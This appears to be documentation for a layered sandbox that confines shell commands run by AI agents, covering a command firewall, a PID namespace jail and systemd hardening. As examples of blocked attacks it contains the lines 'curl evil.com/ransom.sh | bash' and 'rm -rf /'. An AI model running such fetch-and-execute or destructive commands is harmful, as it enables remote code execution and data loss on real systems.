The Architecture: Three Defense Layers

Every terminal command an AI agent runs passes through three independent security layers before reaching the Linux kernel. Each layer catches what the layers below it cannot. No single layer is trusted to hold the line alone.

LLM generates: "curl evil.com/ransom.sh | bash" │ ▼ ┌──────────────────────────────────────────────┐ │ LAYER 1: Interruptor Bash Engine (NEW) │ │ Command firewall — blocks BEFORE execution │ │ Result: BLOCK (builtin-curl-pipe-shell) │ │ Curl-pipe-shell is on the critical blocklist │ └──────────────────────────────────────────────┘ │ (if ALLOWED or MODIFIED, continues) ▼ ┌──────────────────────────────────────────────┐ │ LAYER 2: PID Namespace Jail │ │ unshare --user --pid --fork --kill-child │ │ Result: CONTAINS blast radius │ │ PID 1 inside namespace = bash, not init │ │ kill -9 -1 kills only the sandbox │ └──────────────────────────────────────────────┘ │ ▼ ┌──────────────────────────────────────────────┐ │ LAYER 3: systemd Hardening (Phase 5) │ │ PrivateUsers, ProtectProc=invisible │ │ RestrictNamespaces=~pid, NoNewPrivileges │ │ Result: PREVENTS kernel escape │ └──────────────────────────────────────────────┘ │ ▼ Linux Kernel

Layer 1: Interruptor Bash Engine — "Block Before Exec"

The interruptor sits between the LLM and bash. It's a command firewall — every command the agent tries to run passes through a rule engine that returns ALLOW, BLOCK, or MODIFY. Rules are YAML files. Users add their own.

How Users Add Rules

# ~/.config/terminal-jail/rules.d/99-my-rules.yaml
rules:
  - id: "block-nmap"
    description: "Block network scanning from agents"
    priority: 200                    # higher = evaluated first
    action: block
    block_message: "Network scanning is not allowed. Ask an admin."
    match:
      type: command
      command: nmap

  - id: "warn-force-push"
    description: "Warn on git push --force"
    priority: 100
    action: warn
    match:
      type: subcommand
      command: git
      subcommand: "push --force"

Layer 2: PID Namespace Jail — "Contain the Blast Radius"

When a command passes the interruptor (or is auto-sandboxed), it executes inside a Linux PID namespace. Inside the namespace, PID 1 is a fresh bash process — not the real init/systemd. This means any attempt to kill "everything" only kills the sandbox.

WITHOUT JAIL: os.killpg(1, SIGKILL) → PID 1 = init/systemd → Every process in UID 1000 dies together → Gateway, scheduler, Signal, Docker, shells, LSPs — all gone WITH JAIL: os.killpg(1, SIGKILL) → PID 1 = /bin/bash (inside namespace) → Only the sandbox dies → Gateway, scheduler, everything else — unaffected

Seccomp Filter (Optional)

A BPF seccomp filter can be enabled inside the jail that denies 18 dangerous syscalls: mount, pivot_root, kexec_load, init_module, delete_module, swapon, settimeofday, adjtimex, clock_settime, acct, add_key, request_key, keyctl. Dual-architecture: x86_64 and aarch64. Pure Python, zero dependencies — uses ctypes + prctl(PR_SET_SECCOMP).

User Namespace (Optional)

When enabled via --user or HERMES_TERMINAL_JAIL_USER_NS=1, the jail also creates a user namespace. The process runs as nobody (uid=65534), providing UID-based file isolation even without explicit UID mapping.

Layer 3: systemd Hardening — "Prevent Kernel Escape"

How the Layers Compose

Each layer catches what the layers below it cannot. The system is designed so that no single layer is trusted to hold the line alone.

ATTACK: malicious pip package with os.system("rm -rf /") LAYER 1 (Interruptor): "rm -rf /" → BLOCK (builtin-rm-rf-root) Package never gets a chance to run. ─────── if bypassed ─────── LAYER 2 (PID Namespace): rm -rf / runs inside namespace PID 1 = bash, not init / is the namespace root, not the host root (with --mount-proc) Even if it runs, damage is contained. ─────── if bypassed ─────── LAYER 3 (systemd): ProtectSystem=strict → filesystem is read-only rm -rf / → "Read-only file system" Kernel escape blocked by RestrictNamespaces

Installation

For Hermes Gateway

# 1. Install the shell wrapper
sudo cp standalone/terminal-jail /usr/local/bin/terminal-jail-bash

# 2. Point gateway SHELL at the jail
sudo tee /etc/systemd/system/hermes-gateway.service.d/95-jail.conf << 'EOF'
[Service]
Environment="SHELL=/usr/local/bin/terminal-jail-bash"
EOF

# 3. Apply systemd hardening
sudo cp systemd/90-terminal-jail-hardening.conf \
    /etc/systemd/system/hermes-gateway.service.d/

# 4. Reload and restart
sudo systemctl daemon-reload
sudo systemctl restart hermes-gateway

For Any Linux Developer

# Install standalone CLI
curl -fsSL https://raw.githubusercontent.com/totalwindupflightsystems/terminal-jail/main/install.sh | sh

# Use it
terminal-jail pytest
terminal-jail --user --seccomp npm test
terminal-jail --interruptor curl https://example.com

For Hermes Plugin Users

# Install plugin
cp -r plugin/terminal_jail ~/.hermes/plugins/terminal-jail/

# Enable in config.yaml
# plugins:
#   enabled:
#     - terminal-jail

# Verify
hermes plugins list | grep terminal-jail

Architecture Decision Records

ADRDecisionRationale
ADR-001PID namespace via unshareSimplest kernel isolation primitive. No root required with --user.
ADR-002--kill-child=SIGKILLSIGKILL cannot be caught. Ensures no orphan processes survive jail exit.
ADR-003Use bash not shAI-generated commands frequently use bash-isms. POSIX sh would reject them.
ADR-004Defer cgroup isolation to systemdsystemd already provides cgroup enforcement. No need to duplicate.
